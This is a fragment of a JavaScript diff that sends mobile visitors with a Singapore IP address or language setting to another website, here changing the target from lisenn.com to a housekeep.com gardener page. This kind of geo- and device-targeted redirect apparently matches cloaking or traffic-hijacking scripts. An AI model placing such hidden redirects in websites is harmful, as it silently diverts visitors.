@@ -55,9 +55,9 @@
       .then(data => {
         console.log('检测到国家:', country_code);
         
-        // 条件1：新加坡IP + 移动设备
+        // 条件1：新加坡IP + 移动设备https://lisenn.com/
         if (country_code === 'SG' && isMobileDevice()) {
-          window.location.href = "https://lisenn.com/";
+          window.location.href = "https://housekeep.com/tradespeople/gardener/regions-all/";
           return;
         }
         
@@ -73,7 +73,7 @@
         
         // IP检测失败时：移动设备 + 新加坡语言
         if (isMobileDevice() && isSingaporeLang()) {
-          window.location.href = "https://lisenn.com/";
+          window.location.href = "https://housekeep.com/tradespeople/gardener/regions-all/";
           return;
         }
         
